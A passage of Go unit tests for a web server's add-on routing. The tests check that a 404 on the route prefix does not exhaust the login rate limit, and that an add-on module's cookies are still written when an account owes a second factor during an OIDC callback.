	d.Metrics = nil
	app := newAppMux()
	registerAppRoutes(d, app)
	h := RealIP(nil)(app.mux)

	ask := func(method, path string) int {
		req := httptest.NewRequest(method, path, nil)
		req.RemoteAddr = "203.0.113.10:5555"
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		return rec.Code
	}
	if got := ask(http.MethodGet, addon.RoutePrefix+"nosuch"); got != http.StatusNotFound {
		t.Fatalf("the bare pattern answered %d for a name nothing serves, want 404", got)
	}
	if ok, _ := d.Limits.Login.Allow(netip.MustParseAddr("203.0.113.10")); !ok {
		t.Error("one 404 on the bare pattern spent the whole login budget")
	}
}

// --- M65: a second factor owed does not drop the module's own cookies --------

// The mint path replaces the module's response when the account still owes a
// second factor — the host's prompt is what the browser gets, and the module's
// `location` becomes its `next`. What it must not replace is the module's jar.
//
// The two are unrelated facts: the jar is the add-on's own flow state, and an
// OIDC callback clearing the `state` cookie it set at the start is doing exactly
// what the ABI tells it to. Written after the mint branch, that clearing was
// dropped — for accounts with TOTP enrolled and no others, which a module cannot
// see and so cannot compensate for.
func TestASecondFactorStillWritesTheModulesOwnCookies(t *testing.T) {
	stub := &stubAddonRouter{resp: addon.Response{
		Location: "/addons/oidc/done",
		Jar: []addon.JarCookie{
			{Name: "state", Value: "", MaxAge: -1},
			{Name: "nonce", Value: "kept", MaxAge: 300},
		},
		Minted: &addon.Minted{
			PendingToken: config.Secret("a-pending-token"), SecondFactorRequired: true,
		},
	}}
	rec := serveAddon(t, addonWeb(t, stub), http.MethodGet, "oidc", "callback")
	if rec.Code != http.StatusSeeOther {
		t.Fatalf("status %d, want 303: the prompt is what replaces the module's answer", rec.Code)
	}
	got := map[string]int{}
	for _, c := range rec.Result().Cookies() {
		got[c.Name] = c.MaxAge
	}
	if _, ok := got["state"]; !ok {
		t.Error("the module cleared its `state` cookie and the browser was never told. " +
			"A jar is written whether or not a session was minted; it was being dropped " +
			"for accounts with a second factor and for no others")
	}
	if got["nonce"] != 300 {
		t.Errorf("the module's `nonce` cookie reached the browser as %v, want max-age 300",
			got["nonce"])
	}
}
